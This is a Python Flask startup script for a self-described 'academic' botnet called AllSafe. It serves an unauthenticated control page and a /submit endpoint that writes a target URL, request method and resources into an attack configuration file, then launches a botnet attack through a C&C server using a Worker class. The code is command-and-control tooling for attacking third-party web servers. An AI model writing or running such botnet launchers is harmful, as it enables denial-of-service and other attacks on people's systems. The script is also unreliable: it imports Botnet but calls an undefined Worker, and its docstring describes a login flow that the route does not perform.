#!/usr/bin/python3
"""
This is the startup script for the botnet. Please note that the software is developed under.
Python 3.4.x version of the interpreter.

Authors:    Alessio "Tyrell" Moretti & Federico "Elliot" Vagnoni
Version:    0.1.0
Created:    24 October 2016
Modified:   14 January 2017
"""

from flask import Flask
from flask import render_template
from flask import request
from flask import abort
from flask import redirect
from time import time
import requests
from requests.auth import HTTPBasicAuth
import json
import Botnet

app = Flask(__name__)

"""
The Botnet will use a simple implementation of a micro WebServer using Flask

It will receive HTTP request in both GET and POST method on the root page.

If the method is POST, a login request is assumed and the login process will be performed;
if the process fails an error message will be returned; if it will succed the amdin page will be returned.

If the method is GET, the login form will be shown.
"""
@app.route("/", methods=['GET', 'POST'])
def showControlPage():
    return render_template("localcontrolpage.html")

"""
In the controlpage you can submit a new request of two different type: upload or attack.

Upload has not subtypes. It only allows to prepare the configuration file that will be used
to performa local or a remote attack using the json file given as example.

Attack has two subtypes: local or remote. The former will use the AllSafeBotnet class (defined in Worker.py) to carry
the attack using the override parameter set to True, while the latter will use the same method with the override param
set to False.
"""
@app.route("/submit", methods=['POST'])
def performAttack():
    if 'attack' in request.form:
        if request.form['attack'] == 'begin':
            # retrieving and polishing C&C server and prepare config file
            cc_server = prepareConfigFile(request.form)
            if '://' not in cc_server:
                cc_server = 'http://' + cc_server
            allsafe = Worker.AllSafeBotnet()
            allsafe.autopilot(cc_server, './data/current_attack.txt', 5, override=False)
            return "OK", 200

    else:
        return "Forbidden!", 403


# def show_login_form():
#     # The render template method will render an HTML page using Jinja2 template if any.
#     return render_template("loginpage.html")


# def login(ip, username, password):
#     #It will just valide the username and password and it will return the correct page
#     try:
#         isvalid = validate(ip, username, password)
#     except requests.exceptions.RequestException as ReqExc:
#         # TODO log?
#         return "Page not found", 404
#     if (isvalid):
#         return redirect("http://" + ip, code=301)
#     else:
#         return abort(401)
#
#
# def validate(ip, username, password):
#
#     response = requests.post("http://" + ip + '/login', auth=HTTPBasicAuth(username, password))
#     if (response.status_code == 200):
#         return True
#     else:
#         #even if the requests fails the login phase is aborted
#         return False


def prepareConfigFile(params, where='./data/current_attack.txt'):
    #The json file used as example will be used in order to not rwrite the already existing schema
    file = open("./utils/config_schema_example.json", "r")
    text = file.read()
    configfile = json.loads(text)
    file.close()

    #Only the useful key values will be changed accordingly #TODO more values to change
    configfile['last_modified'] = round(time())
    print(configfile['targets'])
    paramconfig = configfile['targets'][0]['request_params']
    paramconfig['method'] = params['method']
    paramconfig['url'] = params['url']
    new_res = []
    for res in params['resources'].split(";"):
        new_res.append(res)
    paramconfig['resources'] = new_res
    # TODO add prox
    paramconfig['encoding'] = params['encoding']
    configfile['targets'][0]['request_params'] = paramconfig
    #The json configuration will be written
    file = open(where, "w")
    file.write(json.dumps(configfile,indent=4))
    file.close()
    return paramconfig['cc_server']








if __name__ == "__main__":
    print("-------------------------------------------------------------")
    print("            ALLSAFE BOTNET - Academic purpose only           ")
    print("                          v. 0.1.0                           ")
    print("\nDeveloped with no harmful intentions and love by:          ")
    print("  - Alessio 'Tyrell' Moretti                                 ")
    print("  - Federico 'Elliot' Vagnoni                                ")
    print("-------------------------------------------------------------")
    app.run(host='0.0.0.0', port=4042)
